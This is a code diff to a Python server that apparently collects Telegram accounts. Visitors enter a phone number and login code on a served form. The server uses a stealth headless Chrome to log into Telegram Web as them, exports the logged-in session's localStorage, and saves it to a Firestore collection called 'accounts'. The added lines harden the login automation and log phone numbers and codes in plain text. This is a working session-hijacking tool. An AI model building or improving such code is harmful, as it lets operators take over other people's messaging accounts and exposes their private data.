@@ -19,6 +19,9 @@ import uuid
 from socketserver import ThreadingMixIn
 from collections import deque
 import base64
+import subprocess
+import shutil
+import re
 
 
 load_dotenv()
@@ -75,26 +78,110 @@ class TelegramAutomation:
     # ...existing code...
     def setup_driver(self):
         """Configure and initialize the WebDriver"""
-        chrome_options = uc.ChromeOptions()
-        chrome_options.add_argument('--headless=new')  # Use new headless mode for better compatibility
-        chrome_options.add_argument('--disable-gpu')
-        chrome_options.add_argument('--no-sandbox')
-        chrome_options.add_argument('--disable-dev-shm-usage')
-        chrome_options.add_argument('--disable-software-rasterizer')  # Helps with rendering issues in containers
-        chrome_options.add_argument('--remote-debugging-port=9222')  # For debugging if needed
-        chrome_options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36')
+        print("[LOG] Setting up WebDriver...")
+        
+        def create_chrome_options():
+            """Create a fresh ChromeOptions object with all settings"""
+            opts = uc.ChromeOptions()
+            opts.add_argument('--headless=new')  # Use new headless mode for better compatibility
+            opts.add_argument('--disable-gpu')
+            opts.add_argument('--no-sandbox')
+            opts.add_argument('--disable-dev-shm-usage')
+            opts.add_argument('--disable-software-rasterizer')  # Helps with rendering issues in containers
+            opts.add_argument('--remote-debugging-port=9222')  # For debugging if needed
+            opts.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36')
+            return opts
+        
+        def detect_chrome_major_version():
+            """Detect installed Chrome/Chromium major version (returns int or None)"""
+            # Respect explicit env overrides first
+            env_ver = os.environ.get('CHROME_MAJOR') or os.environ.get('CHROME_VERSION') or os.environ.get('CHROME_MAIN_VERSION')
+            if env_ver:
+                m = re.search(r'(\d+)', env_ver)
+                if m:
+                    try:
+                        return int(m.group(1))
+                    except Exception:
+                        pass
+
+            chrome_path = os.environ.get('CHROME_PATH')
+            candidates = []
+            if chrome_path:
+                candidates.append(chrome_path)
+            candidates.extend(['google-chrome-stable', 'google-chrome', 'chromium-browser', 'chromium', 'chrome'])
+
+            for cmd in candidates:
+                try:
+                    which = shutil.which(cmd)
+                    if not which:
+                        continue
+                    out = subprocess.run([which, '--version'], capture_output=True, text=True, timeout=5)
+                    ver = (out.stdout or out.stderr or '').strip()
+                    m = re.search(r'(\d+)\.(\d+)\.(\d+)', ver)
+                    if m:
+                        return int(m.group(1))
+                except Exception:
+                    continue
+            return None
 
         try:
-            # Explicitly set the browser executable path for Docker/Render compatibility
+            # Use undetected_chromedriver without explicit path to let it auto-detect and download matching version
+            print("[LOG] Initializing Chrome with undetected_chromedriver (auto version detection)...")
+            print("[LOG] This may take a moment while downloading the matching ChromeDriver...")
+            chrome_options = create_chrome_options()
+            # Allow specifying explicit Chrome binary path via env var
+            chrome_path = os.environ.get('CHROME_PATH')
+            if chrome_path:
+                try:
+                    chrome_options.binary_location = chrome_path
+                    print(f"[LOG] Using CHROME_PATH: {chrome_path}")
+                except Exception:
+                    pass
+
+            # Try to detect installed Chrome major version and pass to uc so it downloads matching driver
+            version_main = detect_chrome_major_version()
+            if version_main:
+                print(f"[LOG] Detected Chrome major version: {version_main}; passing version_main to uc.Chrome")
+            else:
+                print("[LOG] Could not detect Chrome major version; letting uc auto-detect")
+
             self.driver = uc.Chrome(
                 options=chrome_options,
-                browser_executable_path='/usr/bin/google-chrome-stable',
-                use_subprocess=True  # Helps with process management in containers
+                use_subprocess=True,  # Helps with process management in containers
+                version_main=version_main
             )
-            print("WebDriver initialized successfully")
+            print("[LOG] WebDriver initialized successfully")
+            print(f"[LOG] Chrome version: {self.driver.capabilities.get('browserVersion', 'unknown')}")
         except Exception as e:
-            print(f"Failed to initialize WebDriver: {e}")
-            raise
+            print(f"[ERROR] Failed to initialize WebDriver: {e}")
+            print("[LOG] Attempting with webdriver_manager fallback...")
+            try:
+                # Fallback: try to use webdriver-manager to get correct version
+                from webdriver_manager.chrome import ChromeDriverManager
+                from selenium.webdriver.chrome.service import Service
+                
+                print("[LOG] Using webdriver_manager to get matching ChromeDriver...")
+                # Create a FRESH ChromeOptions object for the fallback attempt
+                chrome_options = create_chrome_options()
+                # If we detected major version, request matching driver from webdriver_manager
+                try:
+                    version_main = detect_chrome_major_version()
+                except Exception:
+                    version_main = None
+                if version_main:
+                    service = Service(ChromeDriverManager(version=str(version_main)).install())
+                else:
+                    service = Service(ChromeDriverManager().install())
+                self.driver = uc.Chrome(
+                    options=chrome_options,
+                    service=service,
+                    use_subprocess=True
+                )
+                print("[LOG] WebDriver initialized successfully with webdriver_manager")
+                print(f"[LOG] Chrome version: {self.driver.capabilities.get('browserVersion', 'unknown')}")
+            except Exception as e2:
+                print(f"[ERROR] Failed with webdriver_manager fallback: {e2}")
+                raise
     # ...existing code...
     def login_with_phone(self, country_code, phone_number):
         """Perform Telegram login with phone number"""
@@ -102,84 +189,167 @@ class TelegramAutomation:
             self.phone_number = f"+{country_code}{phone_number}"
             # Navigate to Telegram Web
             self.driver.get('https://web.telegram.org/a/')
-            print("Navigated to Telegram Web")
+            print("[LOG] Navigated to Telegram Web")
             
             # Wait for page to load
             time.sleep(5)
+            print("[LOG] Page load wait completed")
+            
+            # Log page source to understand structure
+            print("[LOG] Page source length:", len(self.driver.page_source))
+            
+            # Scroll to the bottom to ensure all buttons are visible
+            print("[LOG] Scrolling to bottom of page to find login button...")
+            scroll_result = self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight); return 'scrolled';")
+            print(f"[LOG] Scroll result: {scroll_result}")
+            time.sleep(2)
+            
+            # Check if buttons exist on page
+            all_buttons = self.driver.find_elements(By.TAG_NAME, "button")
+            print(f"[LOG] Total buttons found on page: {len(all_buttons)}")
+            for i, btn in enumerate(all_buttons):
+                try:
+                    btn_text = btn.text.strip()
+                    btn_class = btn.get_attribute('class')
+                    print(f"[LOG] Button {i}: text='{btn_text}' class='{btn_class}'")
+                except Exception as e:
+                    print(f"[LOG] Could not read button {i}: {e}")
             
             # Try multiple selectors for the login button
+            # Prioritize buttons containing "phone" text to avoid clicking "Log in with Passkey" button
+            # Use case-insensitive matching since displayed text is uppercase but source is lowercase
             button_selectors = [
-                "//button[contains(text(), 'Log in by phone Number')]",
+                "//button[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'phone')]",  # Case-insensitive match for "phone"
+                "//button[contains(@class, 'auth-button')][contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'phone')]",  # Button with auth-button class containing "phone"
+                "//button[normalize-space(text())='Log in by phone number']",  # Exact match
+                "//button[contains(text(), 'Log in by phone number')]",  # Contains match
                 "//button[contains(text(), 'Log in by phone')]",
                 "//button[contains(., 'phone')]",
-                "//button[contains(@class, 'auth-button')]",
-                "//button[contains(@class, 'primary')]",
-                "//div[contains(@class, 'button') and contains(text(), 'Log in')]"
+                "(//button[contains(@class, 'auth-button') and contains(@class, 'primary')])[last()]",  # Last primary auth button (to get phone, not passkey)
             ]
             
             button_found = False
-            for selector in button_selectors:
+            for idx, selector in enumerate(button_selectors):
                 try:
-                    button = WebDriverWait(self.driver, 30).until(
+                    print(f"[LOG] Trying selector {idx}: {selector}")
+                    button = WebDriverWait(self.driver, 10).until(
                         EC.element_to_be_clickable((By.XPATH, selector))
                     )
-                    print(f"Button found with selector: {selector}")
-                    button.click()
-                    button_found = True
-                    print("Login button clicked successfully!")
-                    break
+                    btn_text = button.text.strip()
+                    print(f"[LOG] Button found with selector {idx}: '{btn_text}'")
+                    
+                    # Extra verification - make sure it's clickable
+                    if button.is_displayed():
+                        print(f"[LOG] Button is displayed, attempting to click...")
+                        button.click()
+                        button_found = True
+                        print(f"[LOG] Login button clicked successfully!")
+                        break
+                    else:
+                        print(f"[LOG] Button found but not displayed")
                 except Exception as e:
-                    print(f"Selector failed: {selector} - {str(e)}")
+                    print(f"[LOG] Selector {idx} failed: {str(e)}")
                     continue
             
             if not button_found:
-                raise Exception("Could not find login button")
+                print("[LOG] Login button not found via Selenium selectors, trying JS fallback click...")
+                try:
+                    js_click_script = (
+                        "var btns=Array.from(document.querySelectorAll('button'));"
+                        "for(var i=0;i<btns.length;i++){"
+                        "  try{ var t=(btns[i].innerText||btns[i].textContent||'').trim().toLowerCase();"
+                        "    if(t.indexOf('phone')!==-1 || t.indexOf('phone number')!==-1 || t.indexOf('log in')!==-1 || t.indexOf('login')!==-1 || t.indexOf('sign in')!==-1){"
+                        "      btns[i].click(); return {'clicked':true,'index':i,'text':t}; } }catch(e){} }"
+                        "for(var i=btns.length-1;i>=0;i--){ try{ if(btns[i].offsetParent!==null){ var t=(btns[i].innerText||btns[i].textContent||'').trim(); btns[i].click(); return {'clicked':true,'index':i,'text':t}; } }catch(e){} }"
+                        "return {'clicked':false};"
+                    )
+                    result = self.driver.execute_script(js_click_script)
+                    print(f"[LOG] JS click result: {result}")
+                    clicked = False
+                    if isinstance(result, dict):
+                        clicked = result.get('clicked', False)
+                    elif isinstance(result, (list, tuple)) and len(result) > 0:
+                        try:
+                            clicked = bool(result[0].get('clicked'))
+                        except Exception:
+                            clicked = False
+                    elif isinstance(result, str):
+                        try:
+                            import json
+                            rj = json.loads(result)
+                            clicked = rj.get('clicked', False)
+                        except Exception:
+                            clicked = False
+
+                    if clicked:
+                        button_found = True
+                        print("[LOG] Login button clicked via JS fallback")
+                    else:
+                        print("[LOG] JS fallback did not find a suitable button")
+                except Exception as e:
+                    print(f"[LOG] JS fallback failed: {e}")
+
+                if not button_found:
+                    print("[LOG] ERROR: Could not find any login button")
+                    # Save debug info
+                    self.driver.save_screenshot('telegram_button_error.png')
+                    with open('telegram_button_error.html', 'w', encoding='utf-8') as f:
+                        f.write(self.driver.page_source)
+                    raise Exception("Could not find login button")
             
             # Wait for form elements
             time.sleep(3)
+            print("[LOG] Waiting for country dropdown...")
             
             # Click on country dropdown to open it
             country_dropdown = WebDriverWait(self.driver, 10).until(
                 EC.element_to_be_clickable((By.CSS_SELECTOR, "div.CountryCodeInput"))
             )
+            print("[LOG] Country dropdown found, clicking...")
             country_dropdown.click()
-            print("Country dropdown clicked")
+            print("[LOG] Country dropdown clicked")
             
             time.sleep(2)
+            print("[LOG] Searching for country input...")
             
             # Search for country in the dropdown
             search_input = WebDriverWait(self.driver, 10).until(
                 EC.presence_of_element_located((By.CSS_SELECTOR, "input#sign-in-phone-code"))
             )
             search_input.clear()
+            print("[LOG] Country search input found and cleared")
             
             # Get country name from country code
             country_name = self.get_country_name(country_code)
             search_input.send_keys(country_name)
-            print(f"Searched for {country_name}")
+            print(f"[LOG] Searched for country: {country_name}")
             
             time.sleep(2)
+            print("[LOG] Looking for country option in dropdown...")
             
             # Select country from the dropdown
             country_option = WebDriverWait(self.driver, 10).until(
                 EC.element_to_be_clickable((By.XPATH, f"//div[contains(@class, 'MenuItem')]//span[contains(text(), '{country_name}')]"))
             )
+            print(f"[LOG] Country option found: {country_name}")
             country_option.click()
-            print(f"{country_name} selected from dropdown")
+            print(f"[LOG] {country_name} selected from dropdown")
             
             time.sleep(2)
+            print("[LOG] Waiting for phone number input...")
             
             # Enter the phone number
             phone_input = WebDriverWait(self.driver, 10).until(
                 EC.presence_of_element_located((By.CSS_SELECTOR, 'input#sign-in-phone-number'))
             )
-            
+            print("[LOG] Phone number input found")
 
             phone_input.send_keys(phone_number)
-            print("Phone number entered")
+            print(f"[LOG] Phone number entered: {phone_number}")
             
             # Click Next button
             time.sleep(2)
+            print("[LOG] Looking for Next button...")
             next_button_selectors = [
                 "//button[contains(text(), 'Next')]",
                 "//button[contains(@class, 'auth-button') and contains(@class, 'primary')]",
@@ -188,45 +358,55 @@ class TelegramAutomation:
             ]
             
             next_button = None
-            for selector in next_button_selectors:
+            for idx, selector in enumerate(next_button_selectors):
                 try:
+                    print(f"[LOG] Trying Next button selector {idx}: {selector}")
                     if selector.startswith('//'):
                         next_button = self.driver.find_element(By.XPATH, selector)
                     else:
                         next_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                     
                     if next_button.is_enabled():
-                        print(f"Next button found with selector: {selector}")
+                        print(f"[LOG] Next button found with selector {idx}, clicking...")
                         next_button.click()
-                        print("Next button clicked")
+                        print("[LOG] Next button clicked")
                         break
                     else:
                         next_button = None
-                        print("Next button found but disabled")
-                except:
+                        print(f"[LOG] Next button found but disabled")
+                except Exception as e:
+                    print(f"[LOG] Next button selector {idx} failed: {str(e)}")
                     continue
             
             if not next_button:
+                print("[LOG] Next button not found with standard selectors, trying JavaScript click...")
                 # Fallback: try JavaScript click
                 buttons = self.driver.find_elements(By.CSS_SELECTOR, "button.primary")
-                for button in buttons:
+                print(f"[LOG] Found {len(buttons)} buttons with class 'primary'")
+                for i, button in enumerate(buttons):
                     if button.is_displayed():
+                        print(f"[LOG] Clicking button {i} using JavaScript")
                         self.driver.execute_script("arguments[0].click();", button)
-                        print("Clicked button using JavaScript")
+                        print("[LOG] Clicked button using JavaScript")
                         break
             
+            print("[LOG] Phone login step completed, code should be required now")
             self.current_status = "code_required"
             return True
             
         except Exception as e:
-            print(f"Error during phone login: {e}")
+            print(f"[ERROR] Error during phone login: {e}")
+            print(f"[ERROR] Exception type: {type(e).__name__}")
+            import traceback
+            print(f"[ERROR] Traceback: {traceback.format_exc()}")
             self.current_status = f"error: {str(e)}"
             # Save error details
             try:
                 self.driver.save_screenshot('telegram_error.png')
+                print("[LOG] Screenshot saved to telegram_error.png")
                 with open('telegram_error_source.html', 'w', encoding='utf-8') as f:
                     f.write(self.driver.page_source)
-                print("Error screenshot and page source saved.")
+                print("[LOG] Error page source saved to telegram_error_source.html")
             except Exception:
                 pass
             return False
@@ -252,45 +432,56 @@ class TelegramAutomation:
     def enter_login_code(self, code):
         """Enter the login code received from user"""
         try:
+            print(f"[LOG] Starting code entry for code: {code}")
             # Wait for code input page
             code_input = WebDriverWait(self.driver, 30).until(
                 EC.presence_of_element_located((By.ID, "sign-in-code"))
             )
+            print("[LOG] Code input field found")
             
             code_input.send_keys(code)
-            print("Login code submitted")
+            print(f"[LOG] Code submitted: {code}")
             
             # Wait for successful login
+            print("[LOG] Waiting for chat list to appear (login confirmation)...")
             WebDriverWait(self.driver, 30).until(
                 EC.presence_of_element_located((By.CSS_SELECTOR, '.chat-list, .dialogs, .conversation-list'))
             )
-            print("Login successful!")
+            print("[LOG] Login successful! Chat list found")
             
             # Export LocalStorage
+            print("[LOG] Exporting LocalStorage...")
             local_storage_data = self.driver.execute_script("return Object.assign({}, localStorage);")
+            print(f"[LOG] LocalStorage exported, size: {len(str(local_storage_data))} bytes")
+            
             with open('telegram_localstorage_headless.json', 'w') as f:
                 json.dump(local_storage_data, f, indent=2)
-            print("LocalStorage exported to telegram_localstorage_headless.json")
+            print("[LOG] LocalStorage saved to telegram_localstorage_headless.json")
 
             try:
                 if firestore_db:
+                    print("[LOG] Saving to Firestore...")
                     doc = {
                         "phone_number": getattr(self, "phone_number", "unknown"),
                         "local_storage": local_storage_data,
                         "created_at": firestore.SERVER_TIMESTAMP
                     }
                     firestore_db.collection("accounts").add(doc)
-                    print("LocalStorage saved to Firestore collection 'accounts'")
+                    print("[LOG] LocalStorage saved to Firestore collection 'accounts'")
                 else:
-                    print("Firestore not initialized; skipped saving localStorage to Firestore")
+                    print("[LOG] Firestore not initialized; skipped saving localStorage to Firestore")
             except Exception as e:
-                print(f"Failed to save to Firestore: {e}")
+                print(f"[ERROR] Failed to save to Firestore: {e}")
             
             self.current_status = "login_success"
+            print("[LOG] Code entry completed successfully")
             return True
             
         except Exception as e:
-            print(f"Error during code entry: {e}")
+            print(f"[ERROR] Error during code entry: {e}")
+            print(f"[ERROR] Exception type: {type(e).__name__}")
+            import traceback
+            print(f"[ERROR] Traceback: {traceback.format_exc()}")
             self.current_status = f"error: {str(e)}"
             return False
 
@@ -298,10 +489,12 @@ class TelegramAutomation:
         """Close the WebDriver"""
         if self.driver:
             try:
+                print("[LOG] Closing WebDriver...")
                 self.driver.quit()
-            except Exception:
-                pass
-            print("WebDriver closed")
+                print("[LOG] WebDriver closed successfully")
+            except Exception as e:
+                print(f"[ERROR] Error closing WebDriver: {e}")
+            print("[LOG] WebDriver closed")
 
 # Global automation instance (deprecated - kept for backwards compatibility if needed)
 automation = None
@@ -347,6 +540,8 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
         path = parsed.path
         query = urllib.parse.parse_qs(parsed.query)
         session_id = query.get('session', [None])[0] or self.headers.get('X-Session-Id')
+        
+        print(f"[LOG] GET request: path={path}, session_id={session_id}")
 
         if path == '/status':
             # If session supplied, return that session's status
@@ -354,6 +549,7 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
                 with sessions_lock:
                     sess = sessions.get(session_id)
                 if not sess:
+                    print(f"[LOG] Session {session_id} not found")
                     self.send_response(404)
                     self._set_common_headers()
                     self.end_headers()
@@ -363,6 +559,7 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
             else:
                 status = automation.current_status if automation else "not_initialized"
 
+            print(f"[LOG] Returning status: {status}")
             self.send_response(200)
             self._set_common_headers()
             self.end_headers()
@@ -371,6 +568,7 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
         
         elif path == '/':
             # Serve form.html
+            print("[LOG] Serving form.html")
             try:
                 with open('form.html', 'rb') as f:
                     content = f.read()
@@ -433,12 +631,16 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
         # Get content length
         content_length = int(self.headers.get('Content-Length', 0))
         
+        print(f"[LOG] POST request: path={self.path}, content_length={content_length}")
+        
         # Read the POST data
         if content_length > 0:
             post_data = self.rfile.read(content_length)
             try:
                 data = json.loads(post_data.decode('utf-8'))
-            except Exception:
+                print(f"[LOG] POST data received: {list(data.keys())}")
+            except Exception as e:
+                print(f"[ERROR] Failed to parse POST data: {e}")
                 data = {}
         else:
             data = {}
@@ -453,7 +655,10 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
             country_code = data.get('country_code', '')
             phone_number = data.get('phone_number', '')
             
+            print(f"[LOG] Phone login request: country={country_code}, phone={phone_number}")
+            
             if not country_code or not phone_number:
+                print(f"[LOG] Missing country_code or phone_number")
                 response = {"error": "Missing country_code or phone_number"}
                 self.wfile.write(json.dumps(response).encode('utf-8'))
                 return
@@ -475,13 +680,17 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
             with queue_lock:
                 job_queue.append(session_id)
 
+            print(f"[LOG] Session {session_id} created and queued")
             response = {"message": "Enqueued. You will be processed when previous jobs finish.", "session": session_id, "position": len(job_queue)}
             self.wfile.write(json.dumps(response).encode('utf-8'))
             return
         
         elif self.path == '/code':
             session_id = data.get('session') or self.headers.get('X-Session-Id')
+            print(f"[LOG] Code submission for session: {session_id}")
+            
             if not session_id:
+                print(f"[LOG] Missing session id")
                 response = {"error": "Missing session id. Include 'session' in JSON body or 'X-Session-Id' header."}
                 self.wfile.write(json.dumps(response).encode('utf-8'))
                 return
@@ -489,17 +698,20 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
             with sessions_lock:
                 sess = sessions.get(session_id)
             if not sess:
+                print(f"[LOG] Session {session_id} not found")
                 response = {"error": "session_not_found"}
                 self.wfile.write(json.dumps(response).encode('utf-8'))
                 return
 
             code = data.get('code', '')
             if not code:
+                print(f"[LOG] Missing code")
                 response = {"error": "Missing code"}
                 self.wfile.write(json.dumps(response).encode('utf-8'))
                 return
 
             # Store pending code so the processor can use it when this session is active.
+            print(f"[LOG] Storing code for session {session_id}")
             with sessions_lock:
                 sess['pending_code'] = code
                 # If job is still queued, mark that code arrived (so processor won't wait full CODE_WAIT)
@@ -510,6 +722,7 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
             return
         
         else:
+            print(f"[LOG] Unknown POST path: {self.path}")
             response = {"error": "Invalid endpoint"}
             self.wfile.write(json.dumps(response).encode('utf-8'))
             return
@@ -526,6 +739,7 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
 
 def _session_cleaner():
     """Background cleaner to remove old sessions and close browsers"""
+    print("[LOG] Session cleaner started")
     while True:
         with sessions_lock:
             now = time.time()
@@ -535,6 +749,7 @@ def _session_cleaner():
                 expires = val.get('expires_at')
                 if expires:
                     if now > expires:
+                        print(f"[LOG] Session {sid} expired, marking for deletion")
                         to_delete.append(sid)
                     continue
 
@@ -550,10 +765,13 @@ def _session_cleaner():
                     status = None
 
                 if age > QUEUED_TTL:
+                    print(f"[LOG] Session {sid} exceeded QUEUED_TTL ({QUEUED_TTL}s), marking for deletion")
                     to_delete.append(sid)
                 elif status == "login_success" and age > SESSION_TTL:
+                    print(f"[LOG] Session {sid} exceeded SESSION_TTL ({SESSION_TTL}s), marking for deletion")
                     to_delete.append(sid)
                 elif isinstance(status, str) and status.startswith("error:") and age > 600:
+                    print(f"[LOG] Session {sid} is in error state and exceeded 600s, marking for deletion")
                     to_delete.append(sid)
 
             for sid in to_delete:
@@ -565,11 +783,13 @@ def _session_cleaner():
                     pass
                 # Optionally remove any on-disk files tied to session here (if you save per-session localStorage)
                 sessions.pop(sid, None)
+                print(f"[LOG] Session {sid} deleted")
         time.sleep(30)
 
 
 def _queue_processor():
     """Sequentially process queued sessions. Only one browser runs at a time."""
+    print("[LOG] Queue processor started")
     while True:
         session_id = None
         with queue_lock:
@@ -579,17 +799,23 @@ def _queue_processor():
             time.sleep(1)
             continue
 
+        print(f"[LOG] Processing session: {session_id}")
         with sessions_lock:
             sess = sessions.get(session_id)
             if not sess:
+                print(f"[LOG] Session {session_id} not found, skipping")
                 continue
             sess['status'] = 'processing'
             sess['started_at'] = time.time()
+            print(f"[LOG] Session {session_id} status changed to 'processing'")
 
         # Create automation instance here (only one at a time)
         try:
+            print(f"[LOG] Creating TelegramAutomation instance for session {session_id}...")
             auto = TelegramAutomation()
+            print(f"[LOG] TelegramAutomation instance created successfully")
         except Exception as e:
+            print(f"[ERROR] Failed to create TelegramAutomation for session {session_id}: {e}")
             with sessions_lock:
                 sess['status'] = f"error: failed_to_start_browser: {e}"
                 sess['automation'] = None
@@ -599,6 +825,7 @@ def _queue_processor():
             sess['automation'] = auto
 
         # Run login_with_phone in thread to allow applying timeout
+        print(f"[LOG] Starting login thread for session {session_id}...")
         login_thread = threading.Thread(target=lambda: auto.login_with_phone(sess['phone_country'], sess['phone_number']))
         login_thread.daemon = True
         login_thread.start()
@@ -607,8 +834,11 @@ def _queue_processor():
         with sessions_lock:
             status = auto.current_status
 
+        print(f"[LOG] Login thread completed for session {session_id}, status: {status}")
+
         if login_thread.is_alive():
             # login step timed out / stuck
+            print(f"[LOG] Login thread timed out for session {session_id} after {LOGIN_TIMEOUT}s")
             try:
                 auto.current_status = f"error: login_timeout_after_{LOGIN_TIMEOUT}s"
                 auto.close()
@@ -621,6 +851,7 @@ def _queue_processor():
 
         # If login failed quickly, mark error and continue
         if status.startswith("error:"):
+            print(f"[LOG] Login failed for session {session_id}: {status}")
             with sessions_lock:
                 sess['status'] = status
                 sess['automation'] = None
@@ -632,6 +863,7 @@ def _queue_processor():
 
         # If code is required, wait for user code (but not indefinitely)
         if status == "code_required":
+            print(f"[LOG] Code required for session {session_id}, waiting for user input...")
             with sessions_lock:
                 sess['status'] = 'code_required'
             code_deadline = time.time() + CODE_WAIT
@@ -640,12 +872,14 @@ def _queue_processor():
                 with sessions_lock:
                     code = sess.get('pending_code')
                 if code:
+                    print(f"[LOG] Code received for session {session_id}: {code}")
                     got_code = True
                     break
                 time.sleep(1)
 
             if not got_code:
                 # no code provided in time
+                print(f"[LOG] No code received for session {session_id} within {CODE_WAIT}s")
                 try:
                     auto.current_status = f"error: no_code_received_within_{CODE_WAIT}s"
                     auto.close()
@@ -660,12 +894,16 @@ def _queue_processor():
             def _enter_code(a, c):
                 a.enter_login_code(c)
 
+            print(f"[LOG] Starting code entry thread for session {session_id}...")
             code_thread = threading.Thread(target=_enter_code, args=(auto, code))
             code_thread.daemon = True
             code_thread.start()
             code_thread.join(CODE_ENTRY_TIMEOUT)
 
+            print(f"[LOG] Code entry thread completed for session {session_id}")
+
             if code_thread.is_alive():
+                print(f"[LOG] Code entry thread timed out for session {session_id} after {CODE_ENTRY_TIMEOUT}s")
                 try:
                     auto.current_status = f"error: code_entry_timeout_after_{CODE_ENTRY_TIMEOUT}s"
                     auto.close()
@@ -683,6 +921,9 @@ def _queue_processor():
                 sess['pending_code'] = None
                 if auto.current_status == "login_success":
                     sess['expires_at'] = time.time() + SESSION_TTL
+                    print(f"[LOG] Session {session_id} logged in successfully")
+                else:
+                    print(f"[LOG] Session {session_id} code entry failed: {auto.current_status}")
 
             # If login_success, leave local storage saving logic inside enter_login_code (already present)
             try:
@@ -694,6 +935,7 @@ def _queue_processor():
 
         else:
             # unexpected status - close and mark
+            print(f"[LOG] Unexpected status for session {session_id}: {status}")
             try:
                 auto.current_status = f"error: unexpected_status_{status}"
                 auto.close()
@@ -707,21 +949,21 @@ def _queue_processor():
 def run_server():
     port = int(os.environ.get('PORT', 8765))
     server = ThreadedHTTPServer(('0.0.0.0', port), TelegramHTTPHandler)
-    print(f"HTTP server started on 0.0.0.0:{port} (threaded)")
+    print(f"[LOG] HTTP server started on 0.0.0.0:{port} (threaded)")
     # start session cleaner
     cleaner = threading.Thread(target=_session_cleaner, daemon=True)
     cleaner.start()
-    print("Session cleaner thread started")
+    print("[LOG] Session cleaner thread started")
     # start queue processor (single worker)
     processor = threading.Thread(target=_queue_processor, daemon=True)
     processor.start()
-    print("Queue processor thread started (single active automation)")
+    print("[LOG] Queue processor thread started (single active automation)")
 
-    print("Press Ctrl+C to stop the server")
+    print("[LOG] Press Ctrl+C to stop the server")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
-        print("\nShutting down server...")
+        print("\n[LOG] Shutting down server...")
         # close all sessions' browsers
         with sessions_lock:
             for sid, val in sessions.items():
@@ -731,6 +973,7 @@ def run_server():
                 except Exception:
                     pass
         server.server_close()
+        print("[LOG] Server shut down complete")
 
 if __name__ == "__main__":
     run_server()
